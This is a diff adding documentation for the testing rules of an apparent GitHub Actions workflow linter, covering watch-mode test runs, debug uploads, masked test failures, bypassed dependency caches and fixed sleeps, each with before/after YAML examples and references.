+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+- run: npx ng test
+```
+
+After:
+
+```yaml
+- run: npx ng test --watch=false --browsers=ChromeHeadless
+```
+
+References:
+
+- <https://jestjs.io/docs/cli#--watch>
+- <https://vitest.dev/guide/cli.html#vitest-run>
+- <https://karma-runner.github.io/latest/config/configuration-file.html#singlerun>
+- <https://angular.dev/cli/test>
+
+<a id="testing-unconditional-debug-upload"></a>
+
+### testing/unconditional-debug-upload
+
+Uploads of test debugging output (reports, traces, videos, screenshots) should run only when tests fail.
+
+**Why:** A step without `if:` runs only after earlier steps succeed, so a debugging upload placed after the tests uploads megabytes of traces and screenshots on every green run and nothing when the tests fail. `if: failure()` uploads exactly when the output is needed.
+
+- Kind: practice; default severity: info; impact: low; autofix available
+- Presets: `agentic`, `strict`
+
+Before:
+
+```yaml
+- run: npx playwright test
+- uses: actions/upload-artifact@v4
+  with:
+    name: playwright-report
+    path: playwright-report/
+```
+
+After:
+
+```yaml
+- run: npx playwright test
+- uses: actions/upload-artifact@v4
+  if: failure()
+  with:
+    name: playwright-report
+    path: playwright-report/
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/expressions#status-check-functions>
+- <https://github.com/actions/upload-artifact>
+- <https://playwright.dev/docs/ci-intro>
+
+<a id="testing-masked-failures"></a>
+
+### testing/masked-failures
+
+Test failures should fail the job, not be silenced by `continue-on-error: true` or `|| true`.
+
+**Why:** When a failing test step is allowed to pass, the check stays green, regressions merge unnoticed and the minutes spent running the tests buy no signal. Agents that iterate until CI is green are especially misled by a check that cannot fail.
+
+- Kind: practice; default severity: warn; impact: high
+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+- run: npm test
+  continue-on-error: true
+```
+
+After:
+
+```yaml
+- run: npm test
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstepscontinue-on-error>
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idcontinue-on-error>
+
+<a id="testing-cache-disabled-install"></a>
+
+### testing/cache-disabled-install
+
+Jobs that restore a package-manager cache should not clear or bypass that cache in their run steps.
+
+**Why:** Restoring a dependency cache costs a download and a save on every run; clearing it, pointing installs at an empty temporary cache or passing `--no-cache-dir` throws that work away and makes every install download from the registry again.
+
+- Kind: practice; default severity: info; impact: low
+- Presets: `agentic`, `strict`
+
+Before:
+
+```yaml
+- uses: actions/setup-node@v4
+  with:
+    cache: npm
+- run: npm cache clean --force && npm ci
+```
+
+After:
+
+```yaml
+- uses: actions/setup-node@v4
+  with:
+    cache: npm
+- run: npm ci
+```
+
+References:
+
+- <https://github.com/actions/setup-node#caching-global-packages-data>
+- <https://github.com/actions/setup-python#caching-packages-dependencies>
+- <https://docs.npmjs.com/cli/commands/npm-cache>
+
+<a id="testing-fixed-sleep"></a>
+
+### testing/fixed-sleep
+
+Run steps should wait for services to become ready instead of sleeping for a fixed time.
+
+**Why:** A fixed `sleep` before tests is a guess: on a fast runner it wastes the whole interval on every run, and on a slow or busy runner it is too short and the tests fail intermittently. Polling for readiness returns as soon as the service is up and fails clearly when it never comes up.
+
+- Kind: practice; default severity: warn; impact: medium
+- Presets: `recommended`, `agentic`, `strict`
+- Options: `minSeconds` (default `5`)
+
+Before:
+
+```yaml
+- run: docker compose up -d && sleep 30
+- run: npm run test:e2e
+```
+
+After:
+
+```yaml
+- run: docker compose up -d --wait
+- run: npm run test:e2e
+```
+
+References:
+
+- <https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers>
+- <https://docs.docker.com/reference/cli/docker/compose/up/>
+- <https://www.npmjs.com/package/wait-on>
